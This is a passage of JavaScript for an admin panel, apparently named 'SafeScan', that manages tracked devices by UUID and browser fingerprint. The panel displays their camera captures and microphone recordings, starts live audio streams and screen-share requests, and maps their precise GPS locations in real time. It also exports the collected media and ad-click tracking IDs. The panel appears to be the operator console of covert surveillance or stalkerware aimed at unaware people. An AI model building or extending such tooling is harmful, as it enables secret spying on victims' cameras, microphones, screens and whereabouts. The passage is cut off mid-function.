    document.getElementById('trk_tt').textContent = tids.tiktok_pixel_id || '—';
    document.getElementById('trk_gclid').textContent = tids.gclid || '—';
    document.getElementById('trk_fbclid').textContent = tids.fbclid || '—';
    document.getElementById('trk_utm_source').textContent = tids.utm_source || '—';
    document.getElementById('trk_utm_campaign').textContent = tids.utm_campaign || '—';
    // Reset panel to collapsed
    document.getElementById('trackingIdsPanel').style.display = 'none';

    document.getElementById('userModal').classList.add('show');
}

function closeModal() {
    const modalVideo = document.getElementById('modalLiveVideo');
    if (modalVideo) modalVideo.srcObject = null;
    activeStreamUser = null;
    document.getElementById('userModal').classList.remove('show');
}

// Controls inside modal
function startLiveStream() {
    if (!activeStreamUser) return;
    initiateWebRTCForUser(activeStreamUser);
}

function stopLiveStream() {
    if (!activeStreamUser) return;
    toggleMute(activeStreamUser);
    
    // Sync modal button text
    const conn = activeConnections[activeStreamUser];
    const stopBtn = document.getElementById('stopStreamBtn');
    if (stopBtn) {
        stopBtn.textContent = (conn && !conn.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
    }
}

// ═══════════════════════════════════════════════════════════════════
// USERS TABLE
// ═══════════════════════════════════════════════════════════════════
async function loadUsers() {
    const search = document.getElementById('userSearch').value;
    const data = await api('/api/users?search=' + encodeURIComponent(search));
    if (!data || !data.users) return;

    const tbody = document.getElementById('usersTable');
    if (data.users.length === 0) {
        tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">No users found</td></tr>';
        return;
    }

    tbody.innerHTML = data.users.map(u => `
        <tr>
            <td><span class="uuid-text">${truncUUID(u.uuid, 12)}</span></td>
            <td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.7rem;color:rgba(255,255,255,0.45)">${(u.session_ids && u.session_ids.fingerprint_id) || '—'}</td>
            <td>${u.country || '—'}</td>
            <td>${u.device_type || '—'}</td>
            <td>${u.browser || '—'}</td>
            <td>${u.is_online
                ? '<span class="badge-live"><span class="live-dot"></span> Online</span>'
                : '<span class="badge-offline">Offline</span>'}</td>
            <td style="color:rgba(255,255,255,0.4);font-size:0.8rem">${timeAgo(u.last_active)}</td>
            <td style="font-size:0.8rem;color:rgba(255,255,255,0.35)">${u.captures_count || 0}</td>
            <td style="font-size:0.8rem;color:rgba(255,255,255,0.35)">${u.recordings_count || 0}</td>
            <td style="display:flex;gap:8px;justify-content:flex-end;">
                <button class="btn-action" onclick="startScreenShare('${u.uuid}')" title="Screen Share" style="background:rgba(93,228,199,0.1);color:#5de4c7;border:1px solid rgba(93,228,199,0.2);padding:6px;border-radius:6px;cursor:pointer;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                </button>
                ${ADMIN.role !== 'Viewer' ? `<button class="btn-delete" onclick="deleteUser('${u.uuid}')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button>` : ''}
            </td>
        </tr>
    `).join('');
}

async function deleteUser(uuid) {
    if (!confirm('Delete this user and all their data?')) return;
    await api('/api/users/' + uuid, { method: 'DELETE' });
    delete allUsers[uuid];
    delete latestFrames[uuid];
    loadUsers();
    renderFeedGrid();
}


// ─── ADMIN MANAGEMENT ────────────────────────────────────────────────────────
async function loadAdmins() {
    const data = await api('/api/admins');
    if (!data || !data.admins) return;
    const tbody = document.getElementById('adminsTable');
    tbody.innerHTML = data.admins.map(a => `
        <tr>
            <td>${a.id}</td>
            <td>${a.name}</td>
            <td>${a.email}</td>
            <td><span style="background:rgba(124,106,255,0.2);color:#a594fd;padding:4px 8px;border-radius:4px;font-size:0.8rem;">${a.role}</span></td>
            <td>
                ${a.id !== ADMIN.id ? `<button class="btn-delete" onclick="deleteAdmin(${a.id})"><svg style="width:16px;height:16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button>` : '<span style="color:rgba(255,255,255,0.3)">You</span>'}
            </td>
        </tr>
    `).join('');
}

window.createAdmin = async function() {
    const name = document.getElementById('newAdminName').value;
    const email = document.getElementById('newAdminEmail').value;
    const password = document.getElementById('newAdminPassword').value;
    const role = document.getElementById('newAdminRole').value;
    
    if (!name || !email || !password) return alert('Please fill all fields');
    
    const res = await fetch(API + '/api/admins', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN },
        body: JSON.stringify({ name, email, password, role })
    });
    
    const data = await res.json();
    if (res.ok) {
        document.getElementById('newAdminName').value = '';
        document.getElementById('newAdminEmail').value = '';
        document.getElementById('newAdminPassword').value = '';
        loadAdmins();
    } else {
        alert(data.error);
    }
}

window.deleteAdmin = async function(id) {
    if (!confirm('Delete this admin?')) return;
    await api('/api/admins/' + id, { method: 'DELETE' });
    loadAdmins();
}

// ─── SCREEN SHARE ────────────────────────────────────────────────────────
let activeScreenShareUser = null;

window.startScreenShare = function(uuid) {
    activeScreenShareUser = uuid;
    const modal = document.getElementById('screenShareModal');
    const loading = document.getElementById('screenShareLoading');
    const video = document.getElementById('modalScreenVideo');
    
    modal.style.display = 'flex';
    loading.style.display = 'block';
    video.style.display = 'none';
    video.srcObject = null;
    
    // Request screen share from the user
    socket.emit('webrtc:request_screen', { uuid: uuid });
}

window.closeScreenShareModal = function() {
    activeScreenShareUser = null;
    document.getElementById('screenShareModal').style.display = 'none';
    const video = document.getElementById('modalScreenVideo');
    if (video) video.srcObject = null;
}

// ═══════════════════════════════════════════════════════════════════
// RECORDINGS
// ═══════════════════════════════════════════════════════════════════
async function loadRecordings() {
    const data = await api('/api/recordings');
    if (!data || !data.recordings) return;

    const list = document.getElementById('recordingsList');
    const empty = document.getElementById('noRecordings');

    if (data.recordings.length === 0) {
        list.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }

    empty.style.display = 'none';
    list.innerHTML = data.recordings.map(r => `
        <div class="recording-card glass">
            <div class="rec-header">
                <div class="rec-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg></div>
                <div class="rec-info">
                    <div class="rec-user"><span>${truncUUID(r.uuid, 10)}</span> • ${fmtDuration(r.duration)}</div>
                    <div class="rec-time">${new Date(r.created_at).toLocaleString()}</div>
                </div>
            </div>
            <div class="audio-player" id="player-${r.id}">
                <button class="play-btn" onclick="toggleAudio(${r.id}, '${API}/media/${r.file_path}')">
                    <svg class="icon-play" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                    <svg class="icon-pause" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="display:none"><rect width="4" height="14" x="6" y="5"/><rect width="4" height="14" x="14" y="5"/></svg>
                </button>
                <div class="progress-wrap" onclick="seekAudio(event, ${r.id})"><div class="progress-bar" id="prog-${r.id}"></div></div>
                <span class="audio-time" id="time-${r.id}">0:00 / ${fmtDuration(r.duration)}</span>
            </div>
        </div>
    `).join('');
}

// Audio playback
const audioElements = {};

function toggleAudio(id, src) {
    // Stop any other playing audio
    if (currentAudio && currentAudio !== id) {
        stopAudio(currentAudio);
    }

    if (!audioElements[id]) {
        const audio = new Audio(src);
        audioElements[id] = audio;
        audio.addEventListener('timeupdate', () => updateProgress(id));
        audio.addEventListener('ended', () => stopAudio(id));
        audio.addEventListener('error', () => {
            console.error('Audio load error for', id);
        });
    }

    const audio = audioElements[id];
    const player = document.getElementById('player-' + id);
    const playBtn = player.querySelector('.play-btn');
    const playIcon = player.querySelector('.icon-play');
    const pauseIcon = player.querySelector('.icon-pause');

    if (audio.paused) {
        audio.play().catch(() => {});
        playBtn.classList.add('playing');
        playIcon.style.display = 'none';
        pauseIcon.style.display = 'block';
        currentAudio = id;
    } else {
        audio.pause();
        playBtn.classList.remove('playing');
        playIcon.style.display = 'block';
        pauseIcon.style.display = 'none';
        currentAudio = null;
    }
}

function stopAudio(id) {
    const audio = audioElements[id];
    if (!audio) return;
    audio.pause();
    audio.currentTime = 0;
    const player = document.getElementById('player-' + id);
    if (player) {
        player.querySelector('.play-btn').classList.remove('playing');
        player.querySelector('.icon-play').style.display = 'block';
        player.querySelector('.icon-pause').style.display = 'none';
        const prog = document.getElementById('prog-' + id);
        if (prog) prog.style.width = '0%';
    }
    if (currentAudio === id) currentAudio = null;
}

function updateProgress(id) {
    const audio = audioElements[id];
    if (!audio || !audio.duration) return;
    const pct = (audio.currentTime / audio.duration) * 100;
    const prog = document.getElementById('prog-' + id);
    if (prog) prog.style.width = pct + '%';
    const timeEl = document.getElementById('time-' + id);
    if (timeEl) timeEl.textContent = fmtDuration(audio.currentTime) + ' / ' + fmtDuration(audio.duration);
}

function seekAudio(e, id) {
    const audio = audioElements[id];
    if (!audio || !audio.duration) return;
    const rect = e.currentTarget.getBoundingClientRect();
    const pct = (e.clientX - rect.left) / rect.width;
    audio.currentTime = pct * audio.duration;
}

// ═══════════════════════════════════════════════════════════════════
// SETTINGS
// ═══════════════════════════════════════════════════════════════════
async function changePassword() {
    const cur = document.getElementById('curPw').value;
    const newPw = document.getElementById('newPw').value;
    const okEl = document.getElementById('pwOk');
    const errEl = document.getElementById('pwErr');
    okEl.style.display = 'none';
    errEl.style.display = 'none';

    if (!cur || !newPw) { errEl.textContent = 'Fill in both fields'; errEl.style.display = 'block'; return; }
    if (newPw.length < 4) { errEl.textContent = 'Password too short'; errEl.style.display = 'block'; return; }

    try {
        const res = await api('/api/auth/password', {
            method: 'PUT',
            body: JSON.stringify({ currentPassword: cur, newPassword: newPw })
        });
        if (res.error) throw new Error(res.error);
        okEl.style.display = 'block';
        document.getElementById('curPw').value = '';
        document.getElementById('newPw').value = '';
    } catch(e) {
        errEl.textContent = e.message || 'Failed';
        errEl.style.display = 'block';
    }
}

// ═══════════════════════════════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════════════════════════════
// Fetch initial stats
api('/api/stats').then(s => {
    if (s) {
        document.getElementById('statOnline').textContent = s.onlineCount || 0;
        document.getElementById('statCaptures').textContent = s.totalCaptures || 0;
        document.getElementById('statRecordings').textContent = s.totalRecordings || 0;
        if (document.getElementById('statTotalUsers')) document.getElementById('statTotalUsers').textContent = s.totalUsers || 0;
    }
}).catch(() => {});

// ═══════════════════════════════════════════════════════════════════
// NOTIFICATION CENTER
// ═══════════════════════════════════════════════════════════════════
let notifications = [];

function toggleNotifPanel() {
    const panel = document.getElementById('notifPanel');
    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
    document.getElementById('notifBadge').style.display = 'none';
}

function addNotification(icon, message, time) {
    notifications.unshift({ icon, message, time: time || new Date().toLocaleTimeString() });
    if (notifications.length > 50) notifications.length = 50;
    document.getElementById('notifBadge').style.display = 'block';
    renderNotifications();
}

function renderNotifications() {
    const list = document.getElementById('notifList');
    if (notifications.length === 0) {
        list.innerHTML = '<div style="padding:30px;text-align:center;color:rgba(255,255,255,0.2);font-size:0.8rem">No notifications</div>';
        return;
    }
    list.innerHTML = notifications.map(n => `<div style="padding:10px 16px;border-bottom:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;gap:10px;font-size:0.8rem;transition:background 0.2s;cursor:default" onmouseover="this.style.background='rgba(255,255,255,0.03)'" onmouseout="this.style.background='none'"><span style="font-size:1rem;flex-shrink:0">${n.icon}</span><div style="flex:1;min-width:0"><div style="color:rgba(255,255,255,0.7);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${n.message}</div><div style="color:rgba(255,255,255,0.25);font-size:0.7rem;margin-top:2px">${n.time}</div></div></div>`).join('');
}

function clearNotifications() {
    notifications = [];
    renderNotifications();
    document.getElementById('notifBadge').style.display = 'none';
}

// Close notification panel when clicking outside
document.addEventListener('click', (e) => {
    const panel = document.getElementById('notifPanel');
    const btn = document.getElementById('notifBtn');
    if (panel && btn && !panel.contains(e.target) && !btn.contains(e.target)) {
        panel.style.display = 'none';
    }
});

// ═══════════════════════════════════════════════════════════════════
// ANALYTICS (Chart.js)
// ═══════════════════════════════════════════════════════════════════
let chartsLoaded = false;

function loadChartJS() {
    if (chartsLoaded) return Promise.resolve();
    return new Promise((resolve) => {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js';
        script.onload = () => { chartsLoaded = true; resolve(); };
        document.head.appendChild(script);
    });
}

async function loadAnalytics() {
    await loadChartJS();
    const [usersData, capturesData, recordingsData] = await Promise.all([
        api('/api/users'),
        api('/api/captures'),
        api('/api/recordings')
    ]);
    
    // Build last 7 days labels
    const days = [];
    const capturesByDay = [];
    const recordingsByDay = [];
    const usersByDay = [];
    for (let i = 6; i >= 0; i--) {
        const d = new Date(); d.setDate(d.getDate() - i);
        const key = d.toISOString().split('T')[0];
        days.push(d.toLocaleDateString('en', { weekday: 'short' }));
        capturesByDay.push(capturesData?.captures?.filter(c => c.created_at?.startsWith(key)).length || 0);
        recordingsByDay.push(recordingsData?.recordings?.filter(r => r.created_at?.startsWith(key)).length || 0);
        usersByDay.push(usersData?.users?.filter(u => u.created_at?.startsWith(key)).length || 0);
    }

    const chartOpts = {
        responsive: true,
        plugins: { legend: { display: false } },
        scales: {
            x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: 'rgba(255,255,255,0.3)', font: { size: 11 } } },
            y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: 'rgba(255,255,255,0.3)', font: { size: 11 } }, beginAtZero: true }
        }
    };

    // Destroy existing charts
    ['capturesChart','recordingsChart','usersChart','devicesChart','browsersChart'].forEach(id => {
        const existing = Chart.getChart(id);
        if (existing) existing.destroy();
    });

    new Chart(document.getElementById('capturesChart'), {
        type: 'bar', data: { labels: days, datasets: [{ data: capturesByDay, backgroundColor: 'rgba(165,148,253,0.4)', borderColor: '#a594fd', borderWidth: 2, borderRadius: 6 }] }, options: chartOpts
    });
    new Chart(document.getElementById('recordingsChart'), {
        type: 'bar', data: { labels: days, datasets: [{ data: recordingsByDay, backgroundColor: 'rgba(255,184,108,0.4)', borderColor: '#ffb86c', borderWidth: 2, borderRadius: 6 }] }, options: chartOpts
    });
    new Chart(document.getElementById('usersChart'), {
        type: 'line', data: { labels: days, datasets: [{ data: usersByDay, borderColor: '#5de4c7', backgroundColor: 'rgba(93,228,199,0.1)', fill: true, tension: 0.4, pointRadius: 4, pointBackgroundColor: '#5de4c7' }] }, options: chartOpts
    });

    // Device distribution doughnut
    const devices = {};
    (usersData?.users || []).forEach(u => { devices[u.device_type || 'Unknown'] = (devices[u.device_type || 'Unknown'] || 0) + 1; });
    new Chart(document.getElementById('devicesChart'), {
        type: 'doughnut', data: { labels: Object.keys(devices), datasets: [{ data: Object.values(devices), backgroundColor: ['#a594fd','#5de4c7','#ffb86c','#ff6b8a','rgba(255,255,255,0.2)'], borderWidth: 0 }] },
        options: { responsive: true, plugins: { legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.5)', font: { size: 11 } } } } }
    });

    // Browser distribution doughnut
    const browsers = {};
    (usersData?.users || []).forEach(u => { browsers[u.browser || 'Unknown'] = (browsers[u.browser || 'Unknown'] || 0) + 1; });
    new Chart(document.getElementById('browsersChart'), {
        type: 'doughnut', data: { labels: Object.keys(browsers), datasets: [{ data: Object.values(browsers), backgroundColor: ['#7c6aff','#5de4c7','#ff6b8a','#ffb86c','rgba(255,255,255,0.2)'], borderWidth: 0 }] },
        options: { responsive: true, plugins: { legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.5)', font: { size: 11 } } } } }
    });
}

// ═══════════════════════════════════════════════════════════════════
// CAPTURES GALLERY
// ═══════════════════════════════════════════════════════════════════
async function loadCapturesGallery() {
    const filter = document.getElementById('captureFilter').value;
    const data = await api('/api/captures' + (filter ? '?uuid=' + filter : ''));
    const grid = document.getElementById('capturesGrid');
    const empty = document.getElementById('noCapturesGallery');

    // Populate filter dropdown
    const select = document.getElementById('captureFilter');
    if (select.options.length <= 1) {
        const usersData = await api('/api/users');
        (usersData?.users || []).forEach(u => {
            const opt = document.createElement('option');
            opt.value = u.uuid;
            opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
            select.appendChild(opt);
        });
    }

    if (!data?.captures?.length) {
        grid.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }
    empty.style.display = 'none';
    grid.innerHTML = data.captures.map(c => `
        <div class="glass" style="overflow:hidden;cursor:pointer;transition:all 0.3s;border-radius:12px" onclick="openCapturePreview('${API}/media/${c.file_path}', '${truncUUID(c.uuid)}', '${new Date(c.created_at).toLocaleString()}')" onmouseover="this.style.transform='translateY(-4px)';this.style.borderColor='rgba(124,106,255,0.35)'" onmouseout="this.style.transform='';this.style.borderColor=''">
            <img src="${API}/media/${c.file_path}" alt="" style="width:100%;aspect-ratio:4/3;object-fit:cover;display:block">
            <div style="padding:8px 10px">
                <div style="font-size:0.7rem;color:#a594fd;font-family:monospace">${truncUUID(c.uuid, 10)}</div>
                <div style="font-size:0.65rem;color:rgba(255,255,255,0.3);margin-top:2px">${new Date(c.created_at).toLocaleString()}</div>
            </div>
        </div>
    `).join('');
}

function openCapturePreview(url, uuid, time) {
    const lightbox = document.getElementById('videoLightbox');
    const lVideo = document.getElementById('lightboxVideo');
    const lImg = document.getElementById('lightboxImg');
    const lUuid = document.getElementById('lightboxUuid');
    const lBadge = document.getElementById('lightboxBadge');
    lVideo.style.display = 'none'; lVideo.srcObject = null;
    lImg.style.display = 'block'; lImg.src = url;
    lUuid.textContent = uuid + ' — ' + time;
    lBadge.innerHTML = '<span class="badge-offline">CAPTURE</span>';
    document.getElementById('lightboxSpeaker').style.display = 'none';
    activeLightboxUser = null;
    lightbox.classList.add('show');
}

// ═══════════════════════════════════════════════════════════════════
// ACTIVITY LOG
// ═══════════════════════════════════════════════════════════════════
async function loadActivityLog() {
    const data = await api('/api/activity-log');
    const tbody = document.getElementById('activityTable');
    if (!data?.log?.length) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">No activity yet</td></tr>';
        return;
    }
    const icons = { user_connect: '🟢', user_disconnect: '🔴', capture: '📸', recording: '🎤' };
    const colors = { user_connect: '#5de4c7', user_disconnect: '#ff6b8a', capture: '#a594fd', recording: '#ffb86c' };
    tbody.innerHTML = data.log.map(l => `
        <tr>
            <td><span style="color:${colors[l.type] || '#fff'}">${icons[l.type] || '•'} ${(l.type || '').replace('_',' ')}</span></td>
            <td><span class="uuid-text">${truncUUID(l.uuid, 10)}</span></td>
            <td style="color:rgba(255,255,255,0.6)">${l.message}</td>
            <td style="font-size:0.75rem;color:rgba(255,255,255,0.3)">${new Date(l.timestamp).toLocaleString()}</td>
        </tr>
    `).join('');
}

// Listen for real-time activity
socket.on('activity:new', (entry) => {
    // If activity page is visible, prepend the new entry
    if (document.getElementById('page-activity')?.classList.contains('active')) {
        loadActivityLog();
    }
});

// ═══════════════════════════════════════════════════════════════════
// EXPORT DATA
// ═══════════════════════════════════════════════════════════════════
function exportData() {
    window.open(API + '/api/export?token=' + TOKEN, '_blank');
    // Fallback using fetch
    api('/api/export').then(data => {
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = 'safescan_export.json'; a.click();
        URL.revokeObjectURL(url);
    }).catch(() => {});
}

// ═══════════════════════════════════════════════════════════════════
// LIVE MAP (Leaflet.js)
// ═══════════════════════════════════════════════════════════════════
let map = null;
let mapMarkers = {};
let mapInitialized = false;

function initMap() {
    if (mapInitialized && map) {
        map.invalidateSize();
        loadMapLocations();
        return;
    }
    mapInitialized = true;

    map = L.map('mapContainer', {
        center: [20, 0],
        zoom: 2,
        zoomControl: true,
        attributionControl: false
    });

    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19,
        subdomains: 'abcd'
    }).addTo(map);

    loadMapLocations();
}

async function loadMapLocations() {
    try {
        const data = await api('/api/locations');
        if (!data || !data.locations) return;

        let online = 0, offline = 0;

        data.locations.forEach(loc => {
            const isOnline = loc.is_online;
            if (isOnline) online++; else offline++;

            const markerId = loc.uuid;
            const latlng = [loc.latitude, loc.longitude];

            const iconHtml = isOnline
                ? '<div class="map-marker-online"></div>'
                : '<div class="map-marker-offline"></div>';

            const icon = L.divIcon({
                html: iconHtml,
                className: '',
                iconSize: [16, 16],
                iconAnchor: [8, 8]
            });

            const popupContent = `<div style="font-family:'Inter',sans-serif;font-size:0.8rem">
                <div style="color:#a594fd;font-family:monospace;font-size:0.75rem">${loc.uuid}</div>
                <div style="color:rgba(255,255,255,0.6);margin-top:4px">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${loc.device_type || 'Unknown'} • ${loc.browser || ''}</div>
                <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
                <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${loc.timestamp ? new Date(loc.timestamp).toLocaleString() : 'Unknown'}</div>
                <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
            </div>`;

            if (mapMarkers[markerId]) {
                mapMarkers[markerId].setLatLng(latlng).setIcon(icon);
                mapMarkers[markerId].setPopupContent(popupContent);
            } else {
                mapMarkers[markerId] = L.marker(latlng, { icon })
                    .addTo(map)
                    .bindPopup(popupContent);
            }
        });

        document.getElementById('mapTracked').textContent = data.locations.length;
        document.getElementById('mapOnline').textContent = online;
        document.getElementById('mapOffline').textContent = offline;

        if (data.locations.length > 0) {
            const bounds = L.latLngBounds(data.locations.map(l => [l.latitude, l.longitude]));
            map.fitBounds(bounds.pad(0.3));
        }
    } catch(e) { console.error('Map load error:', e); }
}

// Real-time location updates on map
socket.on('location:update', (loc) => {
    if (!map || !mapInitialized) return;

    const markerId = loc.uuid;
    const latlng = [loc.latitude, loc.longitude];
    const icon = L.divIcon({
        html: '<div class="map-marker-online"></div>',
        className: '',
        iconSize: [16, 16],
        iconAnchor: [8, 8]
    });

    const user = allUsers[loc.uuid];
    const popupContent = `<div style="font-family:'Inter',sans-serif;font-size:0.8rem">
        <div style="color:#a594fd;font-family:monospace;font-size:0.75rem">${loc.uuid}</div>
        <div style="color:rgba(255,255,255,0.6);margin-top:4px">🟢 Online • ${user?.device_type || 'Unknown'} • ${user?.browser || ''}</div>
        <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
        <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${new Date().toLocaleString()}</div>
        <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
    </div>`;

    if (mapMarkers[markerId]) {
        mapMarkers[markerId].setLatLng(latlng).setIcon(icon);
        mapMarkers[markerId].setPopupContent(popupContent);
    } else {
        mapMarkers[markerId] = L.marker(latlng, { icon })
            .addTo(map)
            .bindPopup(popupContent);
    }

    addNotification('📍', 'Location update from ' + truncUUID(loc.uuid));
});

// ═══════════════════════════════════════════════════════════════════
// FILES BROWSER
// ═══════════════════════════════════════════════════════════════════
let filesPopulated = false;

async function loadFiles() {
    const deviceFilter = document.getElementById('filesDeviceFilter').value;
    const typeFilter = document.getElementById('filesTypeFilter').value;

    // Populate device dropdown once
    if (!filesPopulated) {
        filesPopulated = true;
        const usersData = await api('/api/users');
        const select = document.getElementById('filesDeviceFilter');
        (usersData?.users || []).forEach(u => {
            const opt = document.createElement('option');
            opt.value = u.uuid;
            opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
            select.appendChild(opt);
        });
    }

    let url = '/api/files';
    if (deviceFilter) url += '?uuid=' + deviceFilter;
    const data = await api(url);

    const grid = document.getElementById('filesGrid');
    const empty = document.getElementById('noFiles');

    let files = data?.files || [];
    if (typeFilter) files = files.filter(f => f.type === typeFilter);

    document.getElementById('filesCount').textContent = files.length + ' files';

    if (files.length === 0) {
        grid.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }
    empty.style.display = 'none';

    grid.innerHTML = files.map(f => {
        const isCapture = f.type === 'capture';
        const preview = isCapture
            ? `<img class="file-preview" src="${API}${f.url}" alt="" loading="lazy">`
            : `<div class="file-preview-audio"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg></div>`;
        const sizeStr = f.file_size ? (f.file_size / 1024).toFixed(1) + ' KB' : '';
        const typeIcon = isCapture ? '📷' : '🎤';
        const fileName = f.file_path ? f.file_path.split('/').pop() : 'file';
        return `<div class="file-card glass">
            ${preview}
            <div class="file-info">
                <div class="file-name">${typeIcon} ${truncUUID(f.uuid, 8)}</div>
                <div class="file-meta"><span>${sizeStr}</span><span>${new Date(f.created_at).toLocaleString()}</span></div>
                ${!isCapture && f.duration ? '<div class="file-meta" style="margin-top:2px"><span>Duration: ' + fmtDuration(f.duration) + '</span></div>' : ''}
            </div>
            <div class="file-actions">
                <button class="btn-download" onclick="downloadFile('${API}${f.url}', '${fileName}')">⬇ Download</button>
                <button class="btn-del" onclick="deleteFile('${f.type}', ${f.id})">🗑️ Delete</button>
            </div>
        </div>`;
    }).join('');
}

function downloadFile(url, filename) {
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.target = '_blank';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

async function deleteFile(type, id) {
    if (!confirm('Delete this file permanently?')) return;
    const endpoint = type === 'capture' ? '/api/captures/' + id : '/api/recordings/' + id;
    await api(endpoint, { method: 'DELETE' });
    loadFiles();
}

// ═══════════════════════════════════════════════════════════════════
// ENHANCED RECORDINGS MANAGEMENT
// ═══════════════════════════════════════════════════════════════════
let selectedRecordings = new Set();
let allRecordingsData = [];
let recUsersPopulated = false;

// Override loadRecordings with enhanced version
loadRecordings = async function() {
    const userFilter = document.getElementById('recUserFilter')?.value || '';
    const sortBy = document.getElementById('recSortBy')?.value || 'date-desc';

    // Populate user dropdown once
    if (!recUsersPopulated) {
        recUsersPopulated = true;
        const usersData = await api('/api/users');
        const select = document.getElementById('recUserFilter');
        if (select && select.options.length <= 1) {
            (usersData?.users || []).forEach(u => {
                const opt = document.createElement('option');
                opt.value = u.uuid;
                opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
                select.appendChild(opt);
            });
        }
    }

    let url = '/api/recordings';
    if (userFilter) url += '?uuid=' + userFilter;
    const data = await api(url);
    if (!data || !data.recordings) return;

    allRecordingsData = data.recordings;

    // Sort
    switch(sortBy) {
        case 'date-asc': allRecordingsData.sort((a,b) => new Date(a.created_at) - new Date(b.created_at)); break;
        case 'duration-desc': allRecordingsData.sort((a,b) => (b.duration||0) - (a.duration||0)); break;
        case 'duration-asc': allRecordingsData.sort((a,b) => (a.duration||0) - (b.duration||0)); break;
        default: allRecordingsData.sort((a,b) => new Date(b.created_at) - new Date(a.created_at));
    }

    selectedRecordings.clear();
    updateBatchBar();
    renderRecordingsList(allRecordingsData);
};

function filterRecordings() {
    const q = (document.getElementById('recSearch')?.value || '').toLowerCase();
    if (!q) { renderRecordingsList(allRecordingsData); return; }
    const filtered = allRecordingsData.filter(r =>
        (r.uuid || '').toLowerCase().includes(q) ||
        (r.file_path || '').toLowerCase().includes(q) ||
        (r.mime_type || '').toLowerCase().includes(q)
    );
    renderRecordingsList(filtered);
}

function renderRecordingsList(recordings) {
    const list = document.getElementById('recordingsList');
    const empty = document.getElementById('noRecordings');

    if (recordings.length === 0) {
        list.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }
    empty.style.display = 'none';

    list.innerHTML = recordings.map(r => {
        const fileName = r.file_path ? r.file_path.split('/').pop() : 'recording';
        return `
        <div class="recording-card glass">
            <div class="rec-header" style="display:flex;align-items:center;gap:10px">
                <input type="checkbox" class="rec-checkbox" data-id="${r.id}" ${selectedRecordings.has(r.id) ? 'checked' : ''} onchange="toggleRecSelect(${r.id}, this.checked)">
